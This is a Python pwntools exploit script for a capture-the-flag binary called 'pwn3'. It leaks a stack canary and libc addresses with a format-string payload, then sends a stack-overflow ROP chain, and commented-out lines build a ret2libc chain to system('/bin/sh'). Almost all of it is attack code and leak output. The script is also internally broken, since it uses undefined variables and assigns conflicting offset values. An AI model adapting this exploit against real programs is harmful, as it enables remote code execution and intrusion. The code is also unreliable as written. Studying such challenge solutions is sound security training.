from pwn import *

libc_offset = 0x1eb723
pie_offset = 0x1570 
ret_offset = 0x1525
main_offset = 0x1526

pop_rdi_offset = 0x015d3

binsh_offset = 0x1b6613
system_offset = 0x49a50
system_offset = 0x554e0
exit_offset = 0x3f090
exit_offset = 0xe5fb0

flag = "SCG{NOW_GET_VOLDEMORT}"
#all addresses up to 49
leak = "AAAA %1$lp %3$lp %8$lp %39$lp %40$lp %42$lp %44$lp %45$lp %47$lp BBBB"
spell = "Expelliarmus\x00"

#p = remote("172.17.0.4",1024)
#p = remote("hax1.allesctf.net",9102)
p = process("./pwn3")

print(p.recvline())
p.sendline(flag)
print(p.recvuntil("name:"))
p.sendline(leak)
tmp = p.recvuntil("spell:")

print(tmp.split())

pad = cyclic(0xff+0xf)
tmp = tmp.split()
IOstdout = int(tmp[-14],16) - 131 #offset 0x1eb6a0
GIlibcwrite = int(tmp[-13],16) - 23 #offset 0x111300
libcstartmain = int(tmp[-7],16) - 243 #offset 0x270f0
log.info("Stack Canary: {}".format(tmp[4]))
log.info("<_IO_2_1_stdout_>@libc: {}".format(hex(IOstdout)))
log.info("<__GI___libc_write>@libc: {}".format(hex(GIlibcwrite)))
log.info("<__libc_start_main>@libc: {}".format(hex(libcstartmain)))

raw_input("Exploit ?")
idx = cyclic_find("cnaacoaa")

print(p.clean()) # clean socket buffer (read all and print)
p.sendline(spell+pad[:idx]+p64(canary)+"BBBBBBBB"+p64(pop_rdi)+p64(LIBC_START_MAIN)+p64(PUTS)+p64(MAIN))
print(p.recvline())
#p.sendline(spell+pad[:idx]+p64(canary)+"BBBBBBBB"+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system))
#p.sendline(spell+pad[:idx]+p64(canary)+p64(exit)+p64(ret)+p64(pop_rdi)+p64(system)+p64(exit)+p64(bin_sh))#+p64(system))
#p.interactive()
p.clean()
p.close()

'''
REMOTe
[*] <_IO_2_1_stdout_>@libc: 0x7fc73035b6a0
[*] <__GI___libc_write>@libc: 0x7fc730281300
[*] <__libc_start_main>@libc: 0x7fc7301970f0

LOCAL
[*] <_IO_2_1_stdout_>@libc: 0x7fc73035b6a0
[*] <__GI___libc_write>@libc: 0x7fc730281300
[*] <__libc_start_main>@libc: 0x7fc7301970f0
'''